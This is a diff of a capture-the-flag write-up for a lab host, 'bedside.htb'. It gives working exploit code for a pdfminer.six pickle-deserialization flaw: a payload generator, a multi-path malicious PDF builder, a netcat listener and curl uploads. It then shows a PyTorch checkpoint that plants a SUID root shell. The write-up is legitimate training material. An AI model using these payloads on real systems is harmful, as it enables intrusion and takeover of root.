@@ -2,7 +2,7 @@
 
 ## Summary
 
-This machine involved exploiting **CVE-2025-64512** (pdfminer.six arbitrary code execution) to gain initial access, then escalating privileges through a PyTorch checkpoint deserialization vulnerability to achieve root.
+This machine involved exploiting CVE-2025-64512 (pdfminer.six arbitrary code execution) to gain initial access, then escalating privileges through a PyTorch checkpoint deserialization vulnerability to achieve root.
 
 ## Reconnaissance
 
@@ -45,14 +45,15 @@ The `X-Powered-By: pdfminer.six` header indicated the server used pdfminer.six t
 
 ### Vulnerability
 
-**CVE-2025-64512** is an insecure deserialization vulnerability in pdfminer.six (versions prior to 20251107). The `CMapDB._load_data()` function uses `pickle.loads()` to deserialize pickle files referenced by PDFs. A malicious PDF can specify an arbitrary path via the `/Encoding` field, causing the library to load and execute a crafted `.pickle.gz` file.
+CVE-2025-64512 is an insecure deserialization vulnerability in pdfminer.six (versions prior to 20251107). The `CMapDB._load_data()` function uses `pickle.loads()` to deserialize pickle files referenced by PDFs. A malicious PDF can specify an arbitrary path via the `/Encoding` field, causing the library to load and execute a crafted `.pickle.gz` file.
 
 ### Exploitation Process
 
 #### Step 1: Generate the Pickle Payload
 
-```python
-# gen_shell_pickle.py
+```bash
+cat > gen_shell_pickle.py << 'EOF'
+#!/usr/bin/env python3
 import pickle, gzip
 
 class Exploit:
@@ -63,136 +64,168 @@ class Exploit:
 
 with gzip.open("shell.pickle.gz", "wb") as f:
     pickle.dump(Exploit(), f)
-```
+print("wrote shell.pickle.gz")
+EOF
 
-```bash
 python3 gen_shell_pickle.py
 ```
 
-#### Step 2: Create the Malicious PDF
+#### Step 2: Create the Multi-Guess PDF
 
-The PDF contains a font with `/Encoding` pointing to the pickle file path. The library appends `.pickle.gz` automatically.
+Since the exact upload path was unknown, the multi-guess PDF tries multiple candidate paths simultaneously.
 
 ```bash
-cat > evil.pdf << 'EOF'
-%PDF-1.4
-1 0 obj
-<<
-/Type /Catalog
-/Pages 2 0 R
->>
-endobj
-2 0 obj
-<<
-/Type /Pages
-/Kids [3 0 R]
-/Count 1
->>
-endobj
-3 0 obj
-<<
-/Type /Page
-/Parent 2 0 R
-/MediaBox [0 0 612 792]
-/Contents 4 0 R
-/Resources
-<<
-/Font
-<<
-/F1 5 0 R
->>
->>
->>
-endobj
-4 0 obj
-<<
-/Length 44
->>
-stream
-BT
-/F1 12 Tf
-100 700 Td
-(Research Report) Tj
-ET
-endstream
-endobj
-5 0 obj
-<<
-/Type /Font
-/Subtype /Type0
-/BaseFont /EvilFont-Identity-H
-/Encoding /var/www/research.bedside.htb/uploads/shell
-/DescendantFonts [6 0 R]
->>
-endobj
-6 0 obj
-<<
-/Type /Font
-/Subtype /CIDFontType2
-/BaseFont /EvilFont
-/CIDSystemInfo
-<<
-/Registry (Adobe)
-/Ordering (Identity)
-/Supplement 0
->>
-/FontDescriptor 7 0 R
->>
-endobj
-7 0 obj
-<<
-/Type /FontDescriptor
-/FontName /EvilFont
-/Flags 4
-/FontBBox [-1000 -1000 1000 1000]
-/ItalicAngle 0
-/Ascent 1000
-/Descent -200
-/CapHeight 800
-/StemV 80
->>
-endobj
-xref
-0 8
-0000000000 65535 f
-0000000009 00000 n
-0000000058 00000 n
-0000000115 00000 n
-0000000274 00000 n
-0000000370 00000 n
-0000000503 00000 n
-0000000673 00000 n
-trailer
-<<
-/Size 8
-/Root 1 0 R
->>
-startxref
-871
-%%EOF
+cat > multi_guess.py << 'EOF'
+#!/usr/bin/env python3
+
+CANDIDATES = [
+    "/var/www/research.bedside.htb/uploads/shell",
+    "/var/www/research/uploads/shell",
+    "/var/www/html/research/uploads/shell",
+    "/var/www/html/uploads/shell",
+    "/var/www/vhosts/research.bedside.htb/httpdocs/uploads/shell",
+    "/var/www/vhosts/research.bedside.htb/uploads/shell",
+    "/srv/research.bedside.htb/uploads/shell",
+    "/srv/www/research.bedside.htb/uploads/shell",
+    "/var/www/bedside.htb/research/uploads/shell",
+    "/var/www/bedside/research/uploads/shell",
+    "/opt/research/uploads/shell",
+    "/opt/research.bedside.htb/uploads/shell",
+    "/opt/app/uploads/shell",
+    "/app/uploads/shell",
+    "/var/www/portal/uploads/shell",
+    "/var/www/research.bedside.htb/upload/shell",
+]
+
+def pdf_name_escape(path: str) -> str:
+    out = []
+    for ch in path:
+        if ch == "/":
+            out.append("#2F")
+        else:
+            out.append(ch)
+    return "".join(out)
+
+def build_pdf(candidates):
+    objs = []
+    n_fonts = len(candidates)
+    first_font_obj = 4
+    font_obj_nums = list(range(first_font_obj, first_font_obj + n_fonts))
+    content_obj_num = first_font_obj + n_fonts
+    descfont_obj_nums = list(range(content_obj_num + 1, content_obj_num + 1 + n_fonts))
+    fontdesc_obj_nums = list(range(content_obj_num + 1 + n_fonts, content_obj_num + 1 + 2 * n_fonts))
+
+    objs.append((1, "<<\n/Type /Catalog\n/Pages 2 0 R\n>>"))
+    objs.append((2, "<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>"))
+
+    font_res_entries = "\n".join(
+        f"/F{i} {font_obj_nums[i]} 0 R" for i in range(n_fonts)
+    )
+    objs.append((
+        3,
+        "<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n"
+        f"/Contents {content_obj_num} 0 R\n/Resources << /Font << {font_res_entries} >> >>\n>>",
+    ))
+
+    for i, cand in enumerate(candidates):
+        enc_name = pdf_name_escape(cand)
+        objs.append((
+            font_obj_nums[i],
+            "<<\n/Type /Font\n/Subtype /Type0\n"
+            f"/BaseFont /EvilFont{i}-Identity-H\n"
+            f"/Encoding /{enc_name}\n"
+            f"/DescendantFonts [{descfont_obj_nums[i]} 0 R]\n>>",
+        ))
+
+    stream_parts = []
+    for i in range(n_fonts):
+        stream_parts.append(f"/F{i} 12 Tf")
+        stream_parts.append("(x) Tj")
+    stream_body = "BT\n" + "\n".join(stream_parts) + "\nET"
+    objs.append((
+        content_obj_num,
+        f"<<\n/Length {len(stream_body)}\n>>\nstream\n{stream_body}\nendstream",
+    ))
+
+    for i in range(n_fonts):
+        objs.append((
+            descfont_obj_nums[i],
+            "<<\n/Type /Font\n/Subtype /CIDFontType2\n"
+            f"/BaseFont /EvilFont{i}\n"
+            "/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>\n"
+            f"/FontDescriptor {fontdesc_obj_nums[i]} 0 R\n>>",
+        ))
+        objs.append((
+            fontdesc_obj_nums[i],
+            "<<\n/Type /FontDescriptor\n"
+            f"/FontName /EvilFont{i}\n/Flags 4\n"
+            "/FontBBox [-1000 -1000 1000 1000]\n/ItalicAngle 0\n/Ascent 1000\n"
+            "/Descent -200\n/CapHeight 800\n/StemV 80\n>>",
+        ))
+
+    objs.sort(key=lambda x: x[0])
+
+    out = bytearray()
+    out += b"%PDF-1.4\n"
+    offsets = {}
+    for num, body in objs:
+        offsets[num] = len(out)
+        out += f"{num} 0 obj\n".encode()
+        out += body.encode()
+        out += b"\nendobj\n\n"
+
+    xref_offset = len(out)
+    max_num = max(offsets.keys())
+    out += f"xref\n0 {max_num + 1}\n".encode()
+    out += b"0000000000 65535 f \n"
+    for num in range(1, max_num + 1):
+        off = offsets.get(num, 0)
+        out += f"{off:010d} 00000 n \n".encode()
+    out += b"trailer\n"
+    out += f"<<\n/Size {max_num + 1}\n/Root 1 0 R\n>>\n".encode()
+    out += b"startxref\n"
+    out += f"{xref_offset}\n".encode()
+    out += b"%%EOF"
+    return bytes(out)
+
+if __name__ == "__main__":
+    data = build_pdf(CANDIDATES)
+    with open("multi_guess.pdf", "wb") as f:
+        f.write(data)
+    print(f"Wrote multi_guess.pdf with {len(CANDIDATES)} candidate paths, {len(data)} bytes")
+    for c in CANDIDATES:
+        print("  ", c)
 EOF
+
+python3 multi_guess.py
 ```
 
 #### Step 3: Upload in Correct Order
 
 The server processes PDFs immediately. The pickle file must be uploaded first so it exists when the PDF is processed.
 
+Start a listener:
 ```bash
-# Start listener
 nc -lvnp 4444
+```
 
-# Upload pickle (as ZIP)
-zip shell.zip shell.pickle.gz
-curl -X POST http://research.bedside.htb/ -F "uploadFile=@shell.zip"
+Upload the pickle file:
+```bash
+curl -X POST http://research.bedside.htb/ \
+  -F "uploadFile=@shell.pickle.gz" \
+  -v
+```
 
-# Upload PDF (as ZIP)
-zip evil.zip evil.pdf
-curl -X POST http://research.bedside.htb/ -F "uploadFile=@evil.zip"
+Upload the PDF file:
+```bash
+curl -X POST http://research.bedside.htb/ \
+  -F "uploadFile=@multi_guess.pdf" \
+  -v
 ```
 
 #### Step 4: Confirm Access
 
-A reverse shell connects as user **datawrangler**.
+A reverse shell connects as user `datawrangler`.
 
 ```
 datawrangler@data-wrangler:/app$ whoami
@@ -219,13 +252,13 @@ cat /app/pdf_watcher.py
 
 ### Discovery
 
-1. **User `developer`** exists on the system
-2. **Port 3000** runs a React app in development mode
-3. **Sudo entry for developer**:
+1. User `developer` exists on the system
+2. Port 3000 runs a React app in development mode
+3. Sudo entry for developer:
    ```
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
    ```
-4. **Data directories**:
+4. Data directories:
    - `/datastore/checkpoints/` - writable by datawrangler
    - `/datastore/processed/` - read by trainer script
 
@@ -241,12 +274,11 @@ cat /app/pdf_watcher.py
 
 The trainer uses `torch.load()` to load checkpoints, which is vulnerable to pickle deserialization attacks.
 
-#### Step 1: Generate Malicious Checkpoint (as developer)
+#### Step 1: Generate Malicious Checkpoint
 
-The developer user has Python and PyTorch installed. Create a checkpoint that creates a SUID root shell.
+On the developer shell, create a checkpoint that creates a SUID root shell.
 
 ```bash
-# On developer shell
 python3 -c "
 import torch, os
 class Evil:
@@ -261,20 +293,20 @@ print('[+] Created checkpoint')
 base64 -w0 /tmp/checkpoint_epoch_1000.pt
 ```
 
-#### Step 2: Write Checkpoint (as datawrangler)
+#### Step 2: Write Checkpoint
 
 The datawrangler user has write access to `/datastore/checkpoints/`.
 
 ```bash
-# On datawrangler shell
 echo "<BASE64_OUTPUT>" | base64 -d > /datastore/checkpoints/checkpoint_epoch_1000.pt
+```
 
-# Clean processed directory (remove problematic .txt files)
+Clean the processed directory to remove problematic .txt files:
+```bash
 find /datastore/processed -type f ! -name "valid.png" -delete
 ```
 
 Create a valid numpy file for the trainer to load:
-
 ```bash
 cat > /tmp/mknpy.py << 'PYEOF'
 import struct
@@ -298,10 +330,10 @@ PYEOF
 python3 /tmp/mknpy.py
 ```
 
-#### Step 3: Trigger the Exploit (as developer)
+#### Step 3: Trigger the Exploit
 
+On the developer shell, run the trainer:
 ```bash
-# On developer shell
 sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
 ```
 
